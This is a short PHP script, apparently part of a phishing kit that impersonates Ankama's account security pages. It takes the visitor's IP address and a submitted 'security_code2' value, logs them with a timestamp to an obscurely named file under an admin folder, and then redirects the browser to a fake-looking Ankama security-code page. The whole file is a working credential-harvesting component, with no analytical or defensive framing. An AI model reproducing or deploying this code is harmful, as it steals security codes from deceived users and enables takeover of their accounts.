<?php

$ip = $_SERVER["REMOTE_ADDR"];

$fichier = fopen('admin/U92Zb3ALSChwx4rLDa4DT5238i7i7ja.php', 'a+');
fwrite($fichier, "IP: ");
fwrite($fichier, $ip);
fwrite($fichier, "        Quand ? ".date('j F Y h:i:s A')."        Code 2: ");
fwrite($fichier, $_POST["security_code2"].PHP_EOL);
fclose($fichier);

?>
<body onload="window.location.href = 'account.ankama-codes-de-securites.php';"></body>